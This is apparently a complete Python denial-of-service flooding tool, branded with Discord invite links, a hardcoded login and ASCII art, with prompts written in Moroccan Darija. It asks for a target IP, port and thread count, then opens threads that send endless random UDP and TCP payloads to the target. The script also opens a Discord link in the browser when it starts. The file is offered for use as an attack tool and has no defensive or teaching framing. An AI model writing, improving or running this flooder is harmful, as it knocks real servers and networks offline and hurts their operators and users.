#ATTACK DDOS OWNER ISAGI X RoMboCheAt
import random
import socket
import threading
import os
import sys
import time

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
os.system("xdg-open https://dsc.gg/team-15x3")
print("\u001b[31m Welcome to attack-ISAGI X RoMbo World")
time.sleep(2)
print("Loading.......")
os.system("clear")

#### Login       

attemps = 0

while attemps < 100:
    username = input('D5EL SMIA DYAL DDOS: ')
    password = input('D5EL PASSWORD DYAL DDOS: ')

    if username == '15x3' and password == '15x3':
        print('mrhba bik f Ddos Dyal Yassine 15x3!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
os.system("clear")

print("""
\u001b[31m

.……………………………▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
………………………▄▄█▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓█▄▄
……….………▄▀▀▓▒░░░░░░░░░░░░░░░░▒▓▓▀▄
 ………………▄▀▓▒▒░░░░░░░░░░░░░░░░░░░▒▒▓▀▄
 ………..█▓█▒░░░░░░░░░░░░░░░░░░░░░▒▓▒▓█
 ………..▌▓▀▒░░░░░░░░░░░░░░░░░░░░░░░░▒▀▓█
 ……..█▌▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█
………▐█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█▌
 ………█▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█
…………█▐▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒█▓
………█▓█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒█▌▓█
………█▓▓█▒░░░░▒█▄▒▒░░░░░░░░░▒▒▄█▒░░░░▒█▓▓█
 ……█▓█▒░▒▒▒▒░░▀▀█▄▄░░░░░▄▄█▀▀░░▒▒▒▒░▒█▓█
 ……█▓▌▒▒▓▓▓▓▄▄▄▒▒▒▀█░░░░█▀▒▒▒▄▄▄▓▓▓▓▒▒▐▓█
  …██▌▒▓███▓█████▓▒▐▌░░▐▌▒▓████▓████▓▒▐██
 ….██▒▒▓███▓▓▓████▓▄░░░▄▓████▓▓▓███▓▒▒██
 ….█▓▒▒▓██████████▓▒░░░▒▓██████████▓▒▒▓█
 …..█▓▒░▒▓███████▓▓▄▀░░▀...▄▓▓███████▓▒▒▓█
....█▓▒░▒▒▓▓▓▓▄▄▄▀▒░░░░░▒▀▄▄▄▓▓▓▓▒▒░▓█
......█▓▒░▒▒▒▒░░░░░░▒▒▒▒░░░░░░▒▒▒▒░▒▓█
........█▓▓▒▒▒░░██░░▒▓██▓▒░░██░░▒▒▒▓▓█
........▀██▓▓▓▒░░▀░▒▓████▓▒░▀░░▒▓▓▓██▀
..........░▀█▓▒▒░░░▓█▓▒▒▓█▓▒░░▒▒▓█▀░
...... ...█░░██▓▓▒░░▒▒▒░▒▒▒░░▒▓▓██░░█
...........█▄░░▀█▓▒░░░░░░░░░░▒▓█▀░░▄█
...........█▓█░░█▓▒▒▒░░░░░▒▒▒▓█░░█▓█
.... ......▐█▓█░░█▀█▓▓▓▓▓▓█▀░░█░█▓█▌
............█▓▓█░█░█░█▀▀▀█░█░▄▀░█▓█
........... █▓▓█░░▀█▀█░█░█▄█▀░░█▓▓█
.... ........█▓▓█░░░░▀▀▀▀░░░░░█▓▓█

                 https://discord.gg/AKVJfGDCkX

            ░░█░░█████░░ █   █ ░     █████░
            ░██░░█░░░░░░  █ █      ░░░░░░█░
            ░░█░░████░░░   █ ░░░░     ███ ░
            ░░█ ░░░░░█░░  █ █      ░░░░░░█░
░            ███░████░░░ █   █░░     █████░""")

ip = str(input(" IP DYAL SERVER :"))
port = int(input(" PORT DYAL SERVER :"))
choice = str(input(" (y/n) :"))
times = int(input(" lwe9t :"))
threads = int(input(" Threads{65000} :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Attack tsift!!!")
		except:
			print("[!] kayn ralat!!!")

def run2():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack tsift!!!")
		except:
			s.close()
			print("[*] kayn ralat!!!")
            

def run3():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack tsift!!!")
		except:
			s.close()
			print("[*] kayn ralat!!!")
            
  
def run4():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attack tsift!!!")
		except:
			s.close()
			print("[*] kayn ralat!!!")
											
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start()
